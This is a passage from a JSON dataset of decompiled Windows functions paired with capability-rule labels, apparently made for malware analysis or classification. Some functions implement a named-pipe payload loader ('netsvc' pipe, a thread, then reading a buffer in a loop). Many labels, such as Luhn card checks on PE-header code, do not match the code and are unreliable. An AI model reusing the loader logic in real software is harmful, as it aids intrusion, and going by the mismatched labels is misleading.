        "decompiled_code": "\nint64_t fcn.140007120(int64_t arg1, int64_t arg2)\n\n{\n    uint32_t *puVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int64_t iVar6;\n    uint32_t *puVar7;\n    uint64_t uVar8;\n    uint32_t uVar9;\n    uint32_t *puVar10;\n    uint32_t *puVar11;\n    int32_t iVar12;\n    uint32_t *puVar13;\n    uint64_t uVar14;\n    uint32_t *puVar15;\n    int64_t iVar16;\n    \n    iVar12 = *(arg1 + 0x14);\n    iVar3 = *(arg2 + 0x14);\n    iVar16 = arg1;\n    iVar5 = iVar12;\n    if (iVar3 <= iVar12) {\n        iVar16 = arg2;\n        arg2 = arg1;\n        iVar5 = iVar3;\n        iVar3 = iVar12;\n    }\n    uVar9 = *(arg2 + 8);\n    iVar12 = iVar3 + iVar5;\n    if (*(arg2 + 0xc) < iVar12) {\n        uVar9 = uVar9 + 1;\n    }\n    iVar6 = fcn.140006e40(uVar9);\n    if (iVar6 != 0) {\n        puVar7 = iVar6 + 0x18;\n        puVar13 = puVar7 + iVar12;\n        if (puVar7 < puVar13) {\n            puVar7 = sub.msvcrt.dll_memset(puVar7, 0);\n        }\n        puVar15 = iVar16 + 0x18;\n        puVar1 = puVar15 + iVar5;\n        puVar2 = arg2 + 0x18 + iVar3;\n        if (puVar15 < puVar1) {\n            iVar16 = (puVar2 + (-0x19 - arg2) & 0xfffffffffffffffcU) + 4;\n            if (puVar2 < arg2 + 0x19) {\n                iVar16 = 4;\n            }\n            do {\n                while( true ) {\n                    uVar9 = *puVar15;\n                    puVar15 = puVar15 + 1;\n                    if (uVar9 == 0) break;\n                    uVar14 = 0;\n                    puVar10 = puVar7;\n                    puVar11 = arg2 + 0x18;\n                    do {\n                        uVar4 = *puVar11;\n                        puVar11 = puVar11 + 1;\n                        uVar8 = uVar4 * uVar9 + *puVar10 + uVar14;\n                        *puVar10 = uVar8;\n                        uVar14 = uVar8 >> 0x20;\n                        puVar10 = puVar10 + 1;\n                    } while (puVar11 < puVar2);\n                    *(puVar7 + iVar16) = uVar8 >> 0x20;\n                    puVar7 = puVar7 + 1;\n                    if (puVar1 <= puVar15) goto code_r0x000140007243;\n                }\n                puVar7 = puVar7 + 1;\n            } while (puVar15 < puVar1);\n        }\ncode_r0x000140007243:\n        if (0 < iVar12) {\n            do {\n                puVar7 = puVar13 + -1;\n                puVar13 = puVar13 + -1;\n                if (*puVar7 != 0) break;\n                iVar12 = iVar12 + -1;\n            } while (iVar12 != 0);\n        }\n        *(iVar6 + 0x14) = iVar12;\n    }\n    return iVar6;\n}\n",
        "token_count": 825
    },
    "14000751": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t fcn.140007510(int64_t arg1, int64_t arg2)\n\n{\n    int32_t iVar1;\n    uint32_t *puVar2;\n    uint32_t *puVar3;\n    uint32_t uVar4;\n    \n    iVar1 = *(arg2 + 0x14);\n    uVar4 = *(arg1 + 0x14) - iVar1;\n    if (uVar4 == 0) {\n        puVar2 = arg1 + 0x18 + iVar1;\n        puVar3 = arg2 + 0x18 + iVar1 * 4;\n        do {\n            puVar2 = puVar2 + -1;\n            puVar3 = puVar3 + -1;\n            if (*puVar2 != *puVar3) {\n                return -(*puVar2 < *puVar3) | 1;\n            }\n        } while (arg1 + 0x18 < puVar2);\n    }\n    return uVar4;\n}\n",
        "token_count": 218
    },
    "140006bd": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nvoid fcn.140006bd0(int64_t arg1, ulong arg2)\n\n{\n    uint32_t *puVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    int8_t iVar4;\n    int32_t iVar5;\n    uint32_t *puVar6;\n    int64_t iVar7;\n    int64_t iVar8;\n    uint32_t *puVar9;\n    uint32_t *puVar10;\n    uint32_t uVar11;\n    \n    iVar7 = *(arg1 + 0x14);\n    if (arg2 >> 5 < *(arg1 + 0x14)) {\n        puVar1 = arg1 + 0x18;\n        iVar8 = arg2 >> 5;\n        puVar2 = puVar1 + iVar7;\n        puVar6 = puVar1 + iVar8;\n        if ((arg2 & 0x1f) == 0) {\n            puVar9 = puVar1;\n            if (puVar2 <= puVar6) goto code_r0x000140006be6;\n            do {\n                puVar10 = puVar6 + 1;\n                *puVar9 = *puVar6;\n                puVar6 = puVar10;\n                puVar9 = puVar9 + 1;\n            } while (puVar10 < puVar2);\n            puVar6 = puVar1 + (iVar7 - iVar8);\n        }\n        else {\n            uVar3 = *puVar6;\n            puVar6 = puVar6 + 1;\n            iVar4 = arg2 & 0x1f;\n            uVar11 = uVar3 >> iVar4;\n            puVar9 = puVar1;\n            if (puVar6 < puVar2) {\n                do {\n                    puVar10 = puVar6 + 1;\n                    *puVar9 = *puVar6 << (0x20U - iVar4 & 0x1f) | uVar11;\n                    uVar3 = *puVar6;\n                    uVar11 = uVar3 >> iVar4;\n                    puVar9 = puVar9 + 1;\n                    puVar6 = puVar10;\n                } while (puVar10 < puVar2);\n                puVar6 = arg1 + 0x14 + (iVar7 - iVar8) * 4;\n                *puVar6 = uVar11;\n                if (uVar3 >> iVar4 == 0) goto code_r0x000140006c95;\n            }\n            else {\n                *(arg1 + 0x18) = uVar11;\n                puVar6 = puVar1;\n                if (uVar3 >> iVar4 == 0) goto code_r0x000140006be6;\n            }\n            puVar6 = puVar6 + 1;\n        }\ncode_r0x000140006c95:\n        iVar5 = puVar6 - puVar1 >> 2;\n        *(arg1 + 0x14) = iVar5;\n        if (iVar5 != 0) {\n            return;\n        }\n    }\n    else {\ncode_r0x000140006be6:\n        *(arg1 + 0x14) = 0;\n    }\n    *(arg1 + 0x18) = 0;\n    return;\n}\n",
        "token_count": 716
    },
    "14000740": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nint64_t fcn.140007400(int64_t arg1, ulong arg2)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint8_t uVar6;\n    int32_t iVar7;\n    int64_t iVar8;\n    int64_t iVar9;\n    uint64_t arg1_00;\n    int32_t iVar10;\n    uint32_t uVar11;\n    uint32_t *puVar12;\n    uint32_t *puVar13;\n    uint32_t *puVar14;\n    uint32_t *puVar15;\n    int32_t iVar16;\n    \n    arg1_00 = *(arg1 + 8);\n    uVar11 = arg2 >> 5;\n    iVar10 = *(arg1 + 0x14) + uVar11;\n    iVar16 = iVar10 + 1;\n    iVar7 = *(arg1 + 0xc);\n    if (*(arg1 + 0xc) < iVar16) {\n        do {\n            iVar5 = iVar7 * 2;\n            arg1_00 = arg1_00 + 1;\n            iVar4 = iVar7 * -2;\n            iVar7 = iVar5;\n        } while (iVar16 != iVar5 && SBORROW4(iVar16, iVar5) == iVar16 + iVar4 < 0);\n    }\n    iVar8 = fcn.140006e40(arg1_00);\n    if (iVar8 == 0) {\n        return 0;\n    }\n    puVar1 = iVar8 + 0x18;\n    puVar14 = puVar1;\n    if (0 < uVar11) {\n        puVar14 = puVar1 + uVar11;\n        sub.msvcrt.dll_memset(puVar1, 0, uVar11 * 4);\n    }\n    puVar13 = arg1 + 0x18;\n    puVar1 = puVar13 + *(arg1 + 0x14);\n    uVar6 = arg2 & 0x1f;\n    if ((arg2 & 0x1f) == 0) {\n        do {\n            puVar12 = puVar14 + 1;\n            puVar15 = puVar13 + 1;\n            *puVar14 = *puVar13;\n            if (puVar1 <= puVar15) break;\n            puVar14 = puVar14 + 2;\n            puVar13 = puVar13 + 2;\n            *puVar12 = *puVar15;\n        } while (puVar13 < puVar1);\n    }\n    else {\n        uVar11 = 0;\n        puVar15 = puVar14;\n        do {\n            puVar12 = puVar13 + 1;\n            *puVar15 = *puVar13 << uVar6 | uVar11;\n            uVar2 = *puVar13;\n            uVar3 = 0x20 - uVar6 & 0x1f;\n            uVar11 = uVar2 >> uVar3;\n            puVar13 = puVar12;\n            puVar15 = puVar15 + 1;\n        } while (puVar12 < puVar1);\n        iVar9 = (puVar1 + (-0x19 - arg1) & 0xfffffffffffffffcU) + 4;\n        if (puVar1 < arg1 + 0x19U) {\n            iVar9 = 4;\n        }\n        *(puVar14 + iVar9) = uVar11;\n        if (uVar2 >> uVar3 != 0) goto code_r0x0001400074e2;\n    }\n    iVar16 = iVar10;\ncode_r0x0001400074e2:\n    *(iVar8 + 0x14) = iVar16;\n    fcn.140006f30(arg1);\n    return iVar8;\n}\n",
        "token_count": 854
    },
    "14000774": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nuint64_t fcn.140007740(int64_t arg1, int32_t *arg2)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint32_t uVar3;\n    uint8_t uVar4;\n    uint32_t uVar5;\n    uint64_t uVar6;\n    uint32_t uVar7;\n    \n    uVar1 = arg1 + 0x18;\n    iVar2 = uVar1 + *(arg1 + 0x14) * 4;\n    uVar3 = *(iVar2 + -4);\n    uVar7 = 0x1f;\n    if (uVar3 != 0) {\n        for (; uVar3 >> uVar7 == 0; uVar7 = uVar7 - 1) {\n        }\n    }\n    uVar7 = uVar7 ^ 0x1f;\n    *arg2 = 0x20 - uVar7;\n    if (10 < uVar7) {\n        uVar4 = uVar7 - 0xb;\n        if (uVar1 < iVar2 - 4U) {\n            uVar5 = *(iVar2 + -8);\n            uVar6 = uVar5;\n            if (uVar7 - 0xb != 0) {\n                uVar3 = uVar3 << (uVar4 & 0x1f) | uVar5 >> (0x20 - uVar4 & 0x1f);\n                uVar5 = uVar5 << (uVar4 & 0x1f);\n                uVar6 = uVar5;\n                if (uVar1 < iVar2 - 8U) {\n                    return CONCAT44(uVar3, uVar5 | *(iVar2 + -0xc) >> (0x20 - uVar4 & 0x1f)) | 0x3ff0000000000000;\n                }\n            }\n        }\n        else {\n            uVar6 = 0;\n            if (uVar7 != 0xb) {\n                return (uVar3 << (uVar4 & 0x1f) | 0x3ff00000) << 0x20;\n            }\n        }\n        return (uVar3 | 0x3ff00000) << 0x20 | uVar6;\n    }\n    uVar5 = 0;\n    uVar4 = 0xb - uVar7;\n    if (uVar1 < iVar2 - 4U) {\n        uVar5 = *(iVar2 + -8) >> (uVar4 & 0x1f);\n    }\n    return CONCAT44(uVar3 >> (uVar4 & 0x1f), uVar3 << (uVar7 + 0x15U & 0x1f) | uVar5) | 0x3ff0000000000000;\n}\n",
        "token_count": 626
    },
    "14000188": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop",
            "connect pipe",
            "create pipe",
            "write file on Windows",
            "write pipe"
        ],
        "decompiled_code": "\nvoid fcn.140001880(int64_t arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    uint64_t in_stack_ffffffffffffffa8;\n    uint32_t auStack44 [3];\n    \n    auStack44[0] = 0;\n    iVar2 = (*_sym.imp.KERNEL32.dll_CreateNamedPipeA)\n                      (0x1400710a0, 2, 0, 1, in_stack_ffffffffffffffa8 & 0xffffffff00000000, 0, 0, 0);\n    if (iVar2 - 1U < 0xfffffffffffffffe) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_ConnectNamedPipe)(iVar2, 0);\n        if (iVar1 != 0) {\n            for (; 0 < arg2; arg2._0_4_ = arg2 - auStack44[0]) {\n                iVar1 = (*_sym.imp.KERNEL32.dll_WriteFile)(iVar2, arg1, arg2, auStack44, 0);\n                if (iVar1 == 0) break;\n                arg1 = arg1 + auStack44[0];\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 284
    },
    "14000194": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "create or open file",
            "contain loop",
            "read file on Windows"
        ],
        "decompiled_code": "\nulong fcn.140001946(int64_t arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    ulong uVar3;\n    uint32_t auStack44 [3];\n    \n    auStack44[0] = 0;\n    iVar2 = (*_sym.imp.KERNEL32.dll_CreateFileA)(0x1400710a0, 0x80000000, 3, 0, 3, 0x80, 0);\n    uVar3 = 0;\n    if (iVar2 != -1) {\n        for (; 0 < arg2; arg2._0_4_ = arg2 - auStack44[0]) {\n            iVar1 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar2, arg1, arg2, auStack44, 0);\n            if (iVar1 == 0) break;\n            arg1 = arg1 + auStack44[0];\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n        uVar3 = 1;\n    }\n    return uVar3;\n}\n",
        "token_count": 243
    },
    "140002b4": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint64_t fcn.140002b40(ulong arg1)\n\n{\n    uint64_t in_RAX;\n    uint64_t uVar1;\n    ulong *puVar2;\n    ulong auStackX8 [4];\n    uint64_t uStack16;\n    \n    puVar2 = auStackX8;\n    uVar1 = in_RAX;\n    if (0xfff < in_RAX) {\n        do {\n            puVar2 = puVar2 + -0x200;\n            *puVar2 = *puVar2;\n            uVar1 = uVar1 - 0x1000;\n        } while (0x1000 < uVar1);\n    }\n    uStack16 = in_RAX;\n    *(puVar2 - uVar1) = *(puVar2 - uVar1);\n    return uStack16;\n}\n",
        "token_count": 182
    },
    "140002d0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.140002d00(int64_t arg1, ulong arg2, int64_t *arg3)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uchar *puVar4;\n    uchar *puVar5;\n    uchar auStack88 [24];\n    \n    fcn.140007ae0(auStack88, 0);\n    iVar1 = *(arg3 + 2);\n    iVar2 = iVar1;\n    if (arg2 <= iVar1) {\n        iVar2 = arg2;\n    }\n    if (-1 < iVar1) {\n        arg2._0_4_ = iVar2;\n    }\n    if (arg2 < *(arg3 + 0xc)) {\n        iVar1 = *(arg3 + 0xc) - arg2;\n        *(arg3 + 0xc) = iVar1;\n        if ((*(arg3 + 9) & 4) == 0) {\n            *(arg3 + 0xc) = iVar1 + -1;\n            do {\n                fcn.140002ca0(0x20, arg3);\n                iVar1 = *(arg3 + 0xc);\n                *(arg3 + 0xc) = iVar1 + -1;\n            } while (iVar1 != 0);\n            if (arg2 < 1) goto code_r0x000140002e0d;\n        }\n        else if (arg2 < 1) {\n            *(arg3 + 0xc) = *(arg3 + 0xc) + -1;\n            goto code_r0x000140002e00;\n        }\n    }\n    else {\n        *(arg3 + 0xc) = 0xffffffff;\n        if (arg2 < 1) {\n            *(arg3 + 0xc) = 0xfffffffe;\n            return;\n        }\n    }\n    iVar3 = 0;\n    do {\n        iVar1 = fcn.140007ae0(auStack88, *(arg1 + iVar3 * 2));\n        if (iVar1 < 1) goto code_r0x000140002e0d;\n        puVar4 = auStack88;\n        do {\n            while( true ) {\n                puVar5 = puVar4 + 1;\n                if (((*(arg3 + 1) & 0x4000) != 0) ||\n                   (iVar2 = *(arg3 + 0x24),  *(arg3 + 5) != iVar2 && iVar2 <= *(arg3 + 5))) break;\ncode_r0x000140002d9a:\n                *(arg3 + 0x24) = iVar2 + 1;\n                puVar4 = puVar5;\n                if (puVar5 == auStack88 + (iVar1 - 1) + 1) goto code_r0x000140002ddc;\n            }\n            if ((*(arg3 + 1) & 0x2000) == 0) {\n                *(*arg3 + *(arg3 + 0x24)) = *puVar4;\n                iVar2 = *(arg3 + 0x24);\n                goto code_r0x000140002d9a;\n            }\n            sub.msvcrt.dll_fputc();\n            *(arg3 + 0x24) = *(arg3 + 0x24) + 1;\n            puVar4 = puVar5;\n        } while (puVar5 != auStack88 + (iVar1 - 1) + 1);\ncode_r0x000140002ddc:\n        iVar3 = iVar3 + 1;\n    } while (0 < arg2 - iVar3);\n    iVar1 = *(arg3 + 0xc);\n    *(arg3 + 0xc) = iVar1 + -1;\n    if (iVar1 < 1) {\n        return;\n    }\ncode_r0x000140002e00:\n    do {\n        fcn.140002ca0(0x20, arg3);\ncode_r0x000140002e0d:\n        iVar1 = *(arg3 + 0xc);\n        *(arg3 + 0xc) = iVar1 + -1;\n    } while (0 < iVar1);\n    return;\n}\n",
        "token_count": 914
    },
    "140002e9": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.140002e90(uchar *arg1, ulong arg2, int64_t *arg3)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uchar *puVar4;\n    \n    uVar1 = *(arg3 + 2);\n    uVar3 = uVar1;\n    if (arg2 <= uVar1) {\n        uVar3 = arg2;\n    }\n    if (-1 < uVar1) {\n        arg2._0_4_ = uVar3;\n    }\n    if (arg2 < *(arg3 + 0xc)) {\n        iVar2 = *(arg3 + 0xc) - arg2;\n        *(arg3 + 0xc) = iVar2;\n        uVar1 = *(arg3 + 1);\n        if ((uVar1 & 0x400) == 0) {\n            *(arg3 + 0xc) = iVar2 + -1;\n            do {\n                fcn.140002ca0(0x20, arg3);\n                iVar2 = *(arg3 + 0xc);\n                *(arg3 + 0xc) = iVar2 + -1;\n            } while (iVar2 != 0);\n            if (arg2 == 0) goto code_r0x000140002f31;\n            goto code_r0x000140002ece;\n        }\n        if (arg2 == 0) {\n            *(arg3 + 0xc) = *(arg3 + 0xc) + -1;\n            goto code_r0x000140002f41;\n        }\n    }\n    else {\n        *(arg3 + 0xc) = 0xffffffff;\n        if (arg2 == 0) {\n            *(arg3 + 0xc) = 0xfffffffe;\n            return;\n        }\ncode_r0x000140002ece:\n        uVar1 = *(arg3 + 1);\n    }\n    puVar4 = arg1;\n    while( true ) {\n        if (((uVar1 & 0x4000) != 0) || (iVar2 = *(arg3 + 0x24),  *(arg3 + 5) != iVar2 && iVar2 <= *(arg3 + 5))) {\n            if ((uVar1 & 0x2000) == 0) {\n                *(*arg3 + *(arg3 + 0x24)) = *puVar4;\n                iVar2 = *(arg3 + 0x24);\n            }\n            else {\n                sub.msvcrt.dll_fputc();\n                iVar2 = *(arg3 + 0x24);\n            }\n        }\n        *(arg3 + 0x24) = iVar2 + 1;\n        if (puVar4 + 1 == arg1 + arg2) break;\n        uVar1 = *(arg3 + 1);\n        puVar4 = puVar4 + 1;\n    }\ncode_r0x000140002f31:\n    while (iVar2 = *(arg3 + 0xc),  *(arg3 + 0xc) = iVar2 + -1,  0 < iVar2) {\n        uVar1 = *(arg3 + 1);\ncode_r0x000140002f41:\n        if (((uVar1 & 0x4000) != 0) || (iVar2 = *(arg3 + 0x24),  *(arg3 + 5) != iVar2 && iVar2 <= *(arg3 + 5))) {\n            if ((uVar1 & 0x2000) == 0) {\n                *(*arg3 + *(arg3 + 0x24)) = 0x20;\n                iVar2 = *(arg3 + 0x24);\n            }\n            else {\n                sub.msvcrt.dll_fputc(0x20);\n                iVar2 = *(arg3 + 0x24);\n            }\n        }\n        *(arg3 + 0x24) = iVar2 + 1;\n    }\n    return;\n}\n",
        "token_count": 866
    },
    "14000518": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t * fcn.140005180(ulong arg1)\n\n{\n    int32_t iVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    \n    uVar3 = 0;\n    if (0x1b < arg1) {\n        iVar1 = 4;\n        do {\n            iVar1 = iVar1 * 2;\n            uVar3 = uVar3 + 1;\n        } while (iVar1 + 0x17 < arg1);\n    }\n    puVar2 = fcn.140006e40(uVar3);\n    *puVar2 = uVar3;\n    return puVar2 + 1;\n}\n",
        "token_count": 147
    },
    "14000185": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140001850(ulong noname_0, ulong noname_1, ulong arg3, ulong arg4)\n\n{\n    ulong uStackX24;\n    ulong uStackX32;\n    \n    uStackX24 = arg3;\n    uStackX32 = arg4;\n    fcn.140002b80(0x1400710a0, \"%c%c%c%c%c%c%c%c%cnetsvc\\\\%d\", &uStackX24);\n    return;\n}\n",
        "token_count": 107
    },
    "140001a3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.140001a38(void)\n\n{\n    int64_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    ulong uVar4;\n    uint64_t uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    ulong in_stack_ffffffffffffffe8;\n    uint32_t uVar10;\n    ulong in_stack_fffffffffffffff0;\n    \n    uVar10 = in_stack_fffffffffffffff0 >> 0x20;\n    uVar6 = in_stack_ffffffffffffffe8 >> 0x20;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n    uVar4 = CONCAT44(uVar6, 0x5c);\n    uVar9 = 0x65;\n    uVar8 = 0x70;\n    uVar7 = 0x69;\n    uVar6 = 0x70;\n    uVar5 = (uVar5 & 0xffffffff) % 0x26aa | uVar10 << 0x20;\n    fcn.140001850(0x1400710a0, \"%c%c%c%c%c%c%c%c%cnetsvc\\\\%d\", 0x5c, 0x5c);\n    (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, 0x140001928, 0, 0, 0, uVar6, uVar7, uVar8, uVar9, uVar4, uVar5);\n    iVar1 = *0x14006e8d0;\n    uVar4 = sub.msvcrt.dll_malloc(*(*0x14006e8d0 + 4));\n    pcVar2 = _sym.imp.KERNEL32.dll_Sleep;\n    do {\n        (*pcVar2)(0x400);\n        iVar3 = fcn.140001946(uVar4, *(iVar1 + 4));\n    } while (iVar3 == 0);\n    fcn.14000179c(uVar4, *(iVar1 + 4), iVar1 + 8);\n    sub.msvcrt.dll_free(uVar4);\n    return 0;\n}\n",
        "token_count": 479
    },
    "1400024d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400024d0(void)\n\n{\n    uint *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    \n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x1400711c0);\n    pcVar3 = _sym.imp.KERNEL32.dll_TlsGetValue;\n    pcVar2 = _sym.imp.KERNEL32.dll_GetLastError;\n    for (puVar1 = *0x1400711a0; puVar1 != NULL; puVar1 = *(puVar1 + 4)) {\n        iVar5 = (*pcVar3)(*puVar1);\n        iVar4 = (*pcVar2)();\n        if ((iVar4 == 0) && (iVar5 != 0)) {\n            (**(puVar1 + 2))();\n        }\n    }\n    // WARNING: Could not recover jumptable at 0x000140002539. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x1400711c0);\n    return;\n}\n",
        "token_count": 249
    },
    "14000286": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.140002860(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    int32_t *piVar3;\n    \n    if (((**0x14006e760 == 0x5a4d) && (piVar3 = *(*0x14006e760 + 0x1e) + *0x14006e760,  *piVar3 == 0x4550)) &&\n       (*(piVar3 + 6) == 0x20b)) {\n        iVar2 = piVar3 + *(piVar3 + 5) + 0x18;\n        if (*(piVar3 + 6) != 0) {\n            iVar1 = iVar2 + 0x28;\n            do {\n                if ((*(iVar2 + 0xc) <= arg1 - *0x14006e760) && (arg1 - *0x14006e760 < *(iVar2 + 0xc) + *(iVar2 + 8))) {\n                    return iVar2;\n                }\n                iVar2 = iVar2 + 0x28;\n            } while (iVar2 != iVar1 + (*(piVar3 + 6) - 1) * 0x28);\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 286
    },
    "1400028e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nushort fcn.1400028e0(void)\n\n{\n    int32_t *piVar1;\n    \n    if (((**0x14006e760 == 0x5a4d) && (piVar1 = *0x14006e760 + *(*0x14006e760 + 0x1e),  *piVar1 == 0x4550)) &&\n       (*(piVar1 + 6) == 0x20b)) {\n        return *(piVar1 + 6);\n    }\n    return 0;\n}\n",
        "token_count": 118
    },
    "1400029a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t * fcn.1400029a0(void)\n\n{\n    int16_t *piVar1;\n    \n    if ((**0x14006e760 == 0x5a4d) && (*(*(*0x14006e760 + 0x1e) + *0x14006e760) == 0x4550)) {\n        piVar1 = NULL;\n        if (*(*(*0x14006e760 + 0x1e) + *0x14006e760 + 6) == 0x20b) {\n            piVar1 = *0x14006e760;\n        }\n        return piVar1;\n    }\n    return NULL;\n}\n",
        "token_count": 152
    },
    "140002bb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140002bb0(ulong arg1, int64_t *arg2, ulong arg3, ulong arg4)\n\n{\n    uint32_t uVar1;\n    uint64_t arg2_00;\n    uint16_t uVar2;\n    uint32_t *in_stack_00000028;\n    uint auStack36 [3];\n    int64_t iStack24;\n    uint32_t uStack16;\n    \n    iStack24 = *arg2;\n    uStack16 = *(arg2 + 1);\n    uVar2 = uStack16 & 0x7fff;\n    uVar1 = iStack24 >> 0x20;\n    if ((uStack16 & 0x7fff) == 0) {\n        if ((iStack24 | uVar1) == 0) {\n            auStack36[0] = 0;\n            arg2_00 = 0;\n        }\n        else {\n            if (iStack24 < 0) goto code_r0x000140002beb;\n            auStack36[0] = 2;\n            arg2_00 = 0xffffbfc3;\n        }\n    }\n    else if (uVar2 == 0x7fff) {\n        if ((uVar1 & 0x7fffffff | iStack24) != 0) {\n            auStack36[0] = 4;\n            arg2_00 = 0;\n            uVar1 = 0;\n            goto code_r0x000140002c04;\n        }\n        auStack36[0] = 3;\n        arg2_00 = 0;\n    }\n    else {\ncode_r0x000140002beb:\n        auStack36[0] = 1;\n        arg2_00 = uVar2 + 0xbfc2;\n    }\n    uVar1 = uStack16 & 0x8000;\ncode_r0x000140002c04:\n    *in_stack_00000028 = uVar1;\n    fcn.1400053f0(0x14006d000, arg2_00, &iStack24, auStack36);\n    return;\n}\n",
        "token_count": 464
    },
    "140002ca": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140002ca0(ulong c, int64_t *arg2)\n\n{\n    int32_t iVar1;\n    \n    if (((*(arg2 + 1) & 0x4000) != 0) || (iVar1 = *(arg2 + 0x24),  *(arg2 + 5) != iVar1 && iVar1 <= *(arg2 + 5))) {\n        if ((*(arg2 + 1) & 0x2000) != 0) {\n            sub.msvcrt.dll_fputc(c, *arg2);\n            *(arg2 + 0x24) = *(arg2 + 0x24) + 1;\n            return;\n        }\n        *(*arg2 + *(arg2 + 0x24)) = c;\n        iVar1 = *(arg2 + 0x24);\n    }\n    *(arg2 + 0x24) = iVar1 + 1;\n    return;\n}\n",
        "token_count": 205
    },
    "140002fe": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140002fe0(uchar *arg1, int64_t *arg2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uchar *puVar5;\n    \n    if (arg1 == NULL) {\n        arg1 = 0x14006e370;\n    }\n    if (*(arg2 + 2) < 0) {\n        uVar3 = sub.msvcrt.dll_strlen();\n    }\n    else {\n        uVar3 = fcn.140007980(arg1, *(arg2 + 2));\n    }\n    uVar1 = *(arg2 + 2);\n    uVar4 = uVar1;\n    if (uVar3 <= uVar1) {\n        uVar4 = uVar3;\n    }\n    if (-1 < uVar1) {\n        uVar3 = uVar4;\n    }\n    if (uVar3 < *(arg2 + 0xc)) {\n        iVar2 = *(arg2 + 0xc) - uVar3;\n        *(arg2 + 0xc) = iVar2;\n        uVar1 = *(arg2 + 1);\n        if ((uVar1 & 0x400) == 0) {\n            *(arg2 + 0xc) = iVar2 + -1;\n            do {\n                fcn.140002ca0(0x20, arg2);\n                iVar2 = *(arg2 + 0xc);\n                *(arg2 + 0xc) = iVar2 + -1;\n            } while (iVar2 != 0);\n            if (uVar3 == 0) goto code_r0x000140002f31;\n            goto code_r0x000140002ece;\n        }\n        if (uVar3 == 0) {\n            *(arg2 + 0xc) = *(arg2 + 0xc) + -1;\n            goto code_r0x000140002f41;\n        }\n    }\n    else {\n        *(arg2 + 0xc) = 0xffffffff;\n        if (uVar3 == 0) {\n            *(arg2 + 0xc) = 0xfffffffe;\n            return;\n        }\ncode_r0x000140002ece:\n        uVar1 = *(arg2 + 1);\n    }\n    puVar5 = arg1;\n    while( true ) {\n        if (((uVar1 & 0x4000) != 0) || (iVar2 = *(arg2 + 0x24),  *(arg2 + 5) != 